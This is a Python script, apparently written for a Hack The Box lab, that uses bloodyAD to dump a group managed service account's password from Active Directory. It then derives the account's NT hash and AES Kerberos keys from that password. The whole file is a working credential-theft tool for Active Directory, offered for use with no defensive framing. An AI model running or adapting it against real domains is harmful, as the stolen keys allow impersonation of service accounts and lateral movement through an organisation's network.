#!/usr/bin/env python3
import base64, binascii, argparse, subprocess, re, sys
from Cryptodome.Hash import MD4
from impacket.krb5.crypto import string_to_key
from impacket.krb5.constants import EncryptionTypes

parser = argparse.ArgumentParser(description='gMSA dumper via bloodyAD + AES key derivation')
parser.add_argument('-u', '--username', required=True, help='Username (ex: FS01$)')
parser.add_argument('-p', '--password', help='Password')
parser.add_argument('-k', '--kerberos', action='store_true', help='Use ccache')
parser.add_argument('--ccache', help='Path to ccache file')
parser.add_argument('-d', '--domain', required=True, help='Domain (ex: vintage.htb)')
parser.add_argument('--dc-host', required=True, help='DC FQDN (ex: dc01.vintage.htb)')
parser.add_argument('-t', '--target', required=True, help='Target gMSA (ex: gMSA01$)')
args = parser.parse_args()

if args.kerberos or args.ccache:
    ccache = args.ccache or f'{args.username}.ccache'
    cmd = ['bloodyAD', '-d', args.domain, '-u', args.username,
           '-k', f'kdc={args.dc_host}', f'ccache={ccache}',
           '--host', args.dc_host]
else:
    cmd = ['bloodyAD', '-d', args.domain, '-u', args.username,
           '-p', args.password, '--host', args.dc_host]

fetch_cmd = cmd + ['get', 'object', args.target, '--attr', 'msDS-ManagedPassword']
result = subprocess.run(fetch_cmd, capture_output=True, text=True)

b64_match = re.search(r'B64ENCODED:\s*(\S+)', result.stdout)
if not b64_match:
    print(f'[-] No password returned for {args.target}')
    if result.stdout: print(result.stdout)
    if result.stderr: print(result.stderr)
    sys.exit(1)

raw = base64.b64decode(b64_match.group(1))
sam = args.target
domain = args.domain

if sam.endswith('$'):
    salt = domain.upper() + 'host' + sam[:-1].lower() + '.' + domain.lower()
else:
    salt = domain.upper() + sam

pwd_utf8 = raw.decode('utf-16-le', 'replace').encode('utf-8')
a256 = binascii.hexlify(string_to_key(EncryptionTypes.aes256_cts_hmac_sha1_96.value, pwd_utf8, salt).contents).decode()
a128 = binascii.hexlify(string_to_key(EncryptionTypes.aes128_cts_hmac_sha1_96.value, pwd_utf8, salt).contents).decode()

print(f'[*] {sam}')
print(f'    Salt:   {salt}')
print(f'    NT:     {MD4.new(raw).hexdigest()}')
print(f'    AES256: {a256}')
print(f'    AES128: {a128}')
